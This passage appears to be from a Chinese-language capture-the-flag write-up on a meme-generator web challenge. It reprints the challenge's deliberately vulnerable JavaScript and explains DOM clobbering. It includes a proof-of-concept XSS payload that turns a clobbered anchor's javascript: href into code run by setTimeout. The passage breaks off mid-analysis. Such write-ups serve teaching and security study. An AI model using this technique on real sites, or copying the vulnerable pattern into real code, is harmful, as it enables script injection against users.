class="hljs-string">&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;</span>);`+</span></span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;meme-card&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;${img}&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>${text}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">        if (text &amp;&amp; img) {</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) {</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                html = (`<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-warning&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Meme<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> created from ${DOMPurify.sanitize(text)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#status&apos;</span>).remove()</span></span><br><span class="line"><span class="hljs-javascript">                notify ? ($(<span class="hljs-string">&apos;#notify&apos;</span>).html(html)) : <span class="hljs-string">&apos;&apos;</span></span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(template)</span></span><br><span class="line">            }, 1000)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;text&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;img&apos;</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="hljs-actionscript">            `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(img)}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;`+</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="hljs-actionscript">    } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(memeTemplate(<span class="hljs-string">&apos;https://i.imgur.com/PdbDexI.jpg&apos;</span>, <span class="hljs-string">&apos;When you get that WW3 draft letter&apos;</span>))</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BA9;&#x6211;&#x6DF1;&#x6DF1;&#x5730;&#x4F53;&#x4F1A;&#x5230;&#x4E86; JavaScript &#x7684;&#x6076;&#x610F;&#x2026;&#x5148;&#x653E;&#x4E2A;&#x56FE;&#xFF0C;&#x5927;&#x5BB6;&#x81EA;&#x884C;&#x5148;&#x4F53;&#x4F1A;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><p>&#x9898;&#x76EE;&#x7528;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x4EE3;&#x7801;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x4EE5;&#x53CA;&#x8F93;&#x51FA;&#x81EA;&#x5B9A;&#x4E49; text &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECD;&#x65E7;&#x662F;&#x4E0A;&#x9898;&#x7684;&#x56DB;&#x4E2A;&#x5916;&#x90E8; JS &#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x5927;&#x6BB5; JS &#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x6D89;&#x53CA;&#x5230; JavaScript &#x6BD4;&#x8F83;&#x591A;&#x7684;&#x9ED1;&#x9B54;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x4E2A;&#x4E2A;&#x6765;&#x770B;&#x770B;&#x3002;</p><p>&#x5BA1;&#x8BA1;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x5230;&#x9898;&#x76EE;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function"><span class="hljs-params">dirty</span> =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FC7;&#x6EE4;&#x6211;&#x4EEC;&#x7684; img &#x53C2;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span class="line">    <span class="hljs-string">`&lt;style&gt;@import url(&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;);`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="hljs-string">`&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;<span class="hljs-subst">${img}</span>&quot;&gt;&lt;h1&gt;<span class="hljs-subst">${text}</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x5C06;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; img &amp; text &#x53C2;&#x6570;&#x6784;&#x9020;&#x4E00;&#x4E2A; HTML &#x6A21;&#x7248;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (notify) {</span><br><span class="line">      html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">        text</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">      )}</span>&lt;/div&gt;`</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span><br><span class="line">      $(<span class="hljs-string">&quot;#status&quot;</span>).remove();</span><br><span class="line">      notify ? $(<span class="hljs-string">&quot;#notify&quot;</span>).html(html) : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">      $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(template);</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FDB;&#x884C; DOM &#x5143;&#x7D20;&#x64CD;&#x4F5C;&#x7B49;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5C31;&#x662F;<code>setTimeout</code>&#x51FD;&#x6570;&#x4E2D;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x628A; notify &#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; true&#x3002;</p><h3 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png" alt></p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;</p><blockquote><p>&#x200B;    The <strong><code>domain</code></strong> property of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">same origin policy</a>.</p></blockquote><p>&#x8FD9;&#x91CC;&#x7684;<code>document.domain</code>&#x5E76;&#x6CA1;&#x6709;&#x83B7;&#x53D6;&#x5230;&#x6211;&#x7684;&#x57DF;&#x540D;<code>zedd.vv</code>&#xFF0C;&#x53CD;&#x800C;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x4E86; img &#x6807;&#x7B7E;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8F93;&#x51FA; document &#x5BF9;&#x8C61;&#x6765;&#x770B;&#x770B;&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png" alt></p><p>&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;&#x7684; id(name) &#x5C5E;&#x6027;&#x6765;&#x63A7;&#x5236; document(window) &#x901A;&#x8FC7; DOM API(BOM API) &#x83B7;&#x53D6;&#x5230;&#x7684;&#x67D0;&#x4E2A;&#x4E1C;&#x897F;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png" alt></p><p>&#x6211;&#x67E5;&#x9605;&#x8FC7;&#x76F8;&#x5173;&#x8D44;&#x6599;&#xFF0C;&#x4E5F;&#x8BE2;&#x95EE;&#x8FC7;&#x4E00;&#x4E9B;&#x524D;&#x7AEF;&#x7684;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x6211;&#x7684;&#x89E3;&#x91CA;&#x662F;&#x201D;document &#x548C; window &#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x5176;&#x5B9E;&#x662F; DOM &#x548C; BOM &#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8FD9;&#x4E24;&#x4E2A;&#x4E0D;&#x5E94;&#x8BE5;&#x88AB;&#x5F53;&#x505A;&#x666E;&#x901A;&#x7684; JS &#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x89C4;&#x8303;&#x4E0E;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x201D;&#xFF0C;&#x201D;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x53E4;&#x9057;&#x7559;&#x95EE;&#x9898;&#xFF0C;&#x73B0;&#x5728;&#x54EA;&#x6709;&#x76F4;&#x63A5;&#x5199; document.xxx &#x6765;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x7684;&#xFF0C;TS &#x548C; eslint &#x90FD;&#x4F1A;&#x62A5;&#x9519;&#x201D;&#x3002;</p><p>&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">dom-clobbering</a>&#xFF0C;&#x4E0D;&#x7B97;&#x662F;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x624B;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x6548;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;&#x8FD9;&#x79CD; Trick &#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>&#x6211;&#x4EEC;&#x4E86;&#x89E3;&#x4E86; Dom Clobbering &#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x901A;&#x8FC7;<code>setTimeout</code>&#x6765;&#x5229;&#x7528;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    a.innerHTML = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;b&apos;</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E;&#x4EE5;&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; Dom Clobbering &#x6765;&#x5B9E;&#x73B0; XSS &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F20;&#x5165; id &#x4E3A; ok &#x7684;&#x6807;&#x7B7E;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F8B;&#x5982;&#x4F20;&#x5165;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ok</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;&#xFF0C;<code>setTimeout</code>&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#x6216;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53EF;&#x662F;&#x6839;&#x636E; Dom Clobbering &#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>ok</code>&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#xFF0C;&#x65E2;&#x7136;&#x8FD9;&#x4E0D;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5C31;&#x5C1D;&#x8BD5;&#x7528;<code>toString</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x800C;&#x6839;&#x636E; MDN &#x6587;&#x6863; <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p><blockquote><p>&#x200B;    <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener"><code>USVString</code></a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.href</code></a>, though it can&#x2019;t be used to modify the value.</p></blockquote><p>&#x800C;&#x5F53; a &#x6807;&#x7B7E;&#x901A;&#x8FC7;<code>toString()</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5B83;&#x7684; href &#x5C5E;&#x6027;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>javascript:alert()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684; notify &#x4E0A;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; DOM Clobbering &#x8FDB;&#x884C;&#x201C;&#x6C61;&#x67D3;&#x201D;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x9898;&#x76EE;&#x76F4;&#x63A5;&#x89C4;&#x5B9A;&#x4E86;<code>let notify = false</code>&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5F53;&#x7136;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x53EF;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x91CC;&#x7684; notify &#x6BD4;&#x8F83;&#x5177;&#x6709;&#x8BEF;&#x5BFC;&#x6027;&#xFF0C;&#x6BD4;&#x8F83;&#x50CF; C &#x8BED;&#x8A00;&#x5165;&#x95E8;&#x7684;&#x65F6;&#x5019;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">truetruetruetrueif (text &amp;&amp; img) {</span><br><span class="line">truetruetruetruetruetemplate = memeTemplate(img, text);</span><br><span class="line">truetruetruetruetrueif (notify) {</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-comment">//...</span></span></span><br><span class="line">truetruetruetruetrue}</span><br><span class="line">truetruetruetrue}</span><br><span class="line">truetruetrue};</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">      `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>` +</span></span></span><br><span class="line"><span class="hljs-actionscript">      `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(</span></span><br><span class="line">        img</span><br><span class="line"><span class="hljs-actionscript">      )}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;` +</span></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="hljs-actionscript">  } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;https://i.imgur.com/PdbDexI.jpg&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;When you get that WW3 draft letter&quot;</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x5C31;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684; C &#x8BED;&#x8A00;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x7684;&#x7EC3;&#x4E60;&#x9898;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, x</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (x) {</span><br><span class="line">    <span class="hljs-comment">//...</span></span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E3A;&#x4E86;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x6210;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x6613;&#x5F04;&#x6DF7;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x6765;&#x8BF4;&#xFF0C;<code>notify</code>&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x533A;&#x522B;&#x4E8E;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x7684; Javascript Scope &#x90E8;&#x5206;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5185;&#x7684;<code>notify</code>&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x53D6;&#x51B3;&#x4E8E;&#x8BE5;&#x51FD;&#x6570;&#x6240;&#x5728;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x3002;</p><p>&#x800C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5B83;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F;&#x5728;<code>let notify = false</code>&#x6240;&#x5904;&#x7684; JS 